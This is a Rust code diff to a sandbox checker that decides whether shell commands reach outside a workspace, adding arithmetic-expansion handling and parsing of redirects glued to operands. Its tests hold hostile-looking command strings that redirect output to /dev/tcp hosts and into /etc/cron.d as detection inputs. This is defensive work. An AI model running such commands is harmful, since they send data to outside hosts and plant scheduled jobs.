@@ -65,6 +65,7 @@ pub(super) fn reaches_outside(
     // targets appear only in the segment text.
     let fixed_expansions = identity_expansions_only(segment, name)
         || exit_status_expansions_only(&segment.text)
+        || arithmetic_expansions_only(&segment.text)
         || (temp_fixed && private_temp_expansions_only(&segment.text));
     let guide = home_fixed && GUIDE_READERS.contains(&name);
     if (expands_variable(&segment.text, name) && !fixed_expansions)
@@ -80,6 +81,16 @@ pub(super) fn reaches_outside(
     }
     if redirect_targets(&segment.text).any(|target| outside(target, name, workspace)) {
         return true;
+    }
+    // A proven stdin-only filter is handed the previous step's output, so its
+    // operands are patterns and counts rather than paths. Reading one as a
+    // path put `ls -R . | grep -v .git` outside the workspace. The same word
+    // has to be inert for that to hold: an environment prefix, a wrapper or
+    // shell syntax inside a word can still name a file this would then skip.
+    if crate::pretool::segment_proof::stdin_filter_segment(segment)
+        && crate::pretool::filter_pattern_text::maskable_filter_segment(segment)
+    {
+        return false;
     }
     segment.arguments.iter().any(|argument| {
         if granted_script == Some(argument.as_str()) || (guide && argument == SAFETY_GUIDE) {
@@ -219,6 +230,39 @@ fn exit_status_expansions_only(text: &str) -> bool {
     count > 0 && count == text.matches('$').count()
 }
 
+/// Whether every `$` in `text` is an arithmetic expansion the shell works
+/// out itself. `$(( ))` evaluates to a number, so `make -j$((2 * 2)) build`
+/// names no path and reads no value the sandbox would resolve differently.
+/// `arithmetic_close` refuses a body that quotes, substitutes a command or
+/// opens a ksh command expansion, so only plain arithmetic reaches here; a
+/// `$NAME` inside the body is a number too and is counted with it.
+fn arithmetic_expansions_only(text: &str) -> bool {
+    let characters: Vec<char> = text.chars().collect();
+    let (mut single, mut double, mut count, mut index) = (false, false, 0usize, 0usize);
+    while let Some(&current) = characters.get(index) {
+        index += 1;
+        match current {
+            '\\' if !single => index += 1,
+            '\'' if !double => single = !single,
+            '"' if !single => double = !double,
+            '`' if !single => return false,
+            '$' if !single => {
+                let Some(close) = crate::parser_segments::arithmetic_close(&characters, index - 1)
+                else {
+                    return false;
+                };
+                count += characters[index - 1..=close]
+                    .iter()
+                    .filter(|character| **character == '$')
+                    .count();
+                index = close + 1;
+            }
+            _ => {}
+        }
+    }
+    count > 0 && count == text.matches('$').count()
+}
+
 /// Whether `text` names `TMPDIR` anywhere other than in a `$TMPDIR` or
 /// `${TMPDIR}` expansion, as an assignment, `export` or `unset` would.
 pub(in crate::pretool) fn rebinds_private_temp(text: &str) -> bool {
@@ -318,23 +362,31 @@ fn expands_variable(text: &str, name: &str) -> bool {
 }
 
 /// Redirect targets live only in the segment text: `> out`, `2>>log`, `&>x`.
+///
+/// A redirect glued to an operand, as in `out/>/dev/tcp/host/443`, still
+/// opens its target, and one word can carry several: `b>x>/etc/cron.d/job`
+/// opens `x` and then `/etc/cron.d/job`. Each target ends at the next operator.
 pub(super) fn redirect_targets(text: &str) -> impl Iterator<Item = &str> {
-    let mut words = text.split_whitespace().peekable();
-    std::iter::from_fn(move || {
-        while let Some(word) = words.next() {
-            let operator = word.trim_start_matches(|c: char| c.is_ascii_digit() || c == '&');
-            if !operator.starts_with(['>', '<']) {
-                continue;
-            }
-            let target = operator.trim_start_matches(['>', '<', '|', '&']);
-            let target = if target.is_empty() {
-                words.next().unwrap_or_default()
-            } else {
-                target
-            };
-            return Some(target.trim_matches(['"', '\'']));
+    let mut words = text.split_whitespace();
+    let mut rest = "";
+    std::iter::from_fn(move || loop {
+        if rest.is_empty() {
+            rest = words.next()?;
         }
-        None
+        let Some(at) = rest.find(['>', '<']) else {
+            rest = "";
+            continue;
+        };
+        let after = rest[at..].trim_start_matches(['>', '<', '|', '&']);
+        // An operator that ends the word takes the next word as its target.
+        let word = if after.is_empty() {
+            words.next().unwrap_or_default()
+        } else {
+            after
+        };
+        let (target, tail) = word.split_at(word.find(['>', '<']).unwrap_or(word.len()));
+        rest = tail;
+        return Some(target.trim_matches(['"', '\'']));
     })
 }
 
@@ -380,3 +432,49 @@ pub(super) fn outside(value: &str, name: &str, workspace: &Path) -> bool {
 #[cfg(test)]
 #[path = "workspace_contained_identity_tests.rs"]
 mod identity_tests;
+
+#[cfg(test)]
+mod redirect_target_tests {
+    use super::redirect_targets;
+
+    fn targets(text: &str) -> Vec<&str> {
+        redirect_targets(text).collect()
+    }
+
+    #[test]
+    fn every_glued_redirect_names_its_own_target() {
+        assert_eq!(
+            targets("cp a b>x>/etc/cron.d/job"),
+            ["x", "/etc/cron.d/job"]
+        );
+        assert_eq!(
+            targets("rsync -a src/ dist/>log>/dev/tcp/host/443"),
+            ["log", "/dev/tcp/host/443"]
+        );
+        assert_eq!(
+            targets("rsync -a src/ fresh/>/dev/tcp/example.com/443"),
+            ["/dev/tcp/example.com/443"]
+        );
+        assert_eq!(targets("echo hi > out 2>&1"), ["out", "1"]);
+        assert_eq!(targets("sort <in >>'log'"), ["in", "log"]);
+        assert!(targets("cargo build --release").is_empty());
+    }
+}
+
+#[cfg(test)]
+mod arithmetic_expansion_tests {
+    use super::arithmetic_expansions_only;
+
+    #[test]
+    fn only_arithmetic_counts_as_a_fixed_expansion() {
+        assert!(arithmetic_expansions_only("make -j$((2 * 2)) build"));
+        assert!(arithmetic_expansions_only(
+            "head -n $((10 * $COUNT)) notes.md"
+        ));
+        assert!(arithmetic_expansions_only("sleep \"$(( (1 + 1) * 2 ))\""));
+        assert!(!arithmetic_expansions_only("make -j$NPROC build"));
+        assert!(!arithmetic_expansions_only("make -j$(nproc) build"));
+        assert!(!arithmetic_expansions_only("make -j$((`nproc`)) build"));
+        assert!(!arithmetic_expansions_only("make build"));
+    }
+}
